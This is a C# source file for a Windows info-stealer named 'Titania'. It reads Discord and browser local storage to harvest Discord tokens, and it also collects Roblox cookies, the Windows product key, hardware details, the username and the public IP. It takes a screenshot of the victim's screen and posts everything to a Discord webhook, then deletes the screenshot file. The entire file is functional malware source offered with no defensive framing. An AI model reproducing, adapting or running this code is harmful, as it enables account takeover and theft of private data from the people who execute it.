using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http.Headers;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Runtime.CompilerServices;
using System.Security.Principal;
using System.Drawing;
using System.Runtime.InteropServices;
using Microsoft.Win32;
using Newtonsoft.Json;
using Webhook;
using System.Security.Cryptography;
using System.Net.Http;
using Image = System.Drawing.Image;
using System.Windows.Forms;
using System.Drawing.Imaging;
using System.Windows;

namespace Titania.Logging
{
    internal class MainLogger
    {
       
        public static void Titania()
        {

            string currentdir = Environment.CurrentDirectory;
            
            var APPDATA = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            var LOCAL = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            var list = new List<String>();
            list.Add(APPDATA + "\\Discord\\Local Storage");
            list.Add(APPDATA + "\\discordcanary\\Local Storage");
            list.Add(APPDATA + "\\discordptb\\Local Storage");
            list.Add(APPDATA + "\\Lightcord\\Local Storage");
            list.Add(LOCAL + "\\Google\\Chrome\\User Data\\Default\\Local Storage");
            list.Add(LOCAL + "\\Google\\Chrome SxS\\User Data\\Local Storage");
            list.Add(LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default");
            list.Add(LOCAL + "\\Microsoft\\Edge\\User Data\\Default\\Local Storage");
            list.Add(LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default");
            list.Add(APPDATA + "\\Opera Software\\Opera Stable\\Local Storage");
            list.Add(APPDATA + "\\Opera Software\\Opera GX Stable\\Local Storage");
            list.Add(LOCAL + "\\Opera Software\\Opera Neon\\User Data\\Default\\Local Storage");
            var token = new List<String>();
            foreach (var path in list)
            {
                var cum1 = path + "\\lev";
                var cum = cum1 + "eldb\\";
                if (!Directory.Exists(cum)) continue;

                var filelist = new DirectoryInfo(cum);
                foreach (var file in filelist.GetFiles())
                {
                    if (file.Equals("LOCK")) continue;
                    try
                    {
                        var data = file.OpenText().ReadToEnd();
                        foreach (Match match in Regex.Matches(data, "[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}|mfa\\.[\\w-]{84}"))
                        {
                            if (token.Contains(match.Value)) continue;
                            var info = TokenUtil.checkToken(match.Value);
                            if (info.vaild)
                            {
                                token.Add(info.username + " > " + info.token);
                            }
                        }

                    }
                    catch (Exception) { }
                }
            }
            var result_token = String.Join("\n", token.ToArray());
            if (String.IsNullOrEmpty(result_token)) result_token = "no token :c";
            string webhook = "";

            Pcinfo m = new Pcinfo();
          
            new DiscordMessage()
    .SetUsername("Titania")
    .SetAvatar("")
    .SetContent("")
    .AddEmbed()
        .SetTitle("Titania")
         .SetColor(16631807)
        .AddField("Info", "IP > " + GetIP() + "Running From > " + currentdir)
        .AddField("Hardware Info", "Windows Product Key > " + Key.GetProductKey()+ "\n OS Name > " + m.osName + "\n Architecture > " + m.osArchitecture + "\n  OS Version > " + m.osVersion + "\n Processor > " + m.processName + "\n GPU > " +m.gpuVideo+ "\n Pc name > " + Environment.MachineName + "\n Username > " + Environment.UserName  +  "\n GPU Version >" +  m.gpuVersion + "\n Disk Details > " + m.diskDetails + "\n Memory > " + m.pcMemory)
        .AddField("Discord Tokens", result_token)
        .AddField("Roblox Cookies", Misc.RobloxCookies())
        .AddField("Ip info", IpInfo())
        .SetFooter("Titania has some info for you UwU", "")
    .Build()
    .SendMessage(webhook);
     
            Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
            Graphics graphics = Graphics.FromImage(bitmap as Image);
            graphics.CopyFromScreen(System.Drawing.Point.Empty, System.Drawing.Point.Empty, bitmap.Size);
            bitmap.Save(currentdir+"/screenshot.jpeg", ImageFormat.Jpeg);
            string FilePath = currentdir + "/screenshot.jpeg";
            using (HttpClient httpClient = new HttpClient())
            {
                MultipartFormDataContent form = new MultipartFormDataContent();
                var file_bytes = System.IO.File.ReadAllBytes(FilePath);
                form.Add(new ByteArrayContent(file_bytes, 0, file_bytes.Length), "Document", "Titania.jpeg");
                httpClient.PostAsync(webhook, form).Wait();
                httpClient.Dispose();
            }
            File.Delete(currentdir + "/screenshot.jpeg");

            
        }
        public static string IpInfo()
        {

            using (WebClient ipwebclient = new WebClient())
            {

                string ipinfo = ipwebclient.DownloadString("http://ip-api.com/line/" + GetIP().ToString());
                return ipinfo;
            }

        }
        public static string GetIP()
        {

            using (WebClient webclient = new WebClient())
            {
                string ip = webclient.DownloadString("https://ipv4.wtfismyip.com/text");
                return ip;
            }


        }

        public static String getJsonKey(String hson, String key)
        {
            try
            {
                return Regex.Match(hson, "\"" + key + "\": \".*\"").Value.Split('"')[3];
            }
            catch (Exception)
            {
                return null;
            }
        }
    }
}
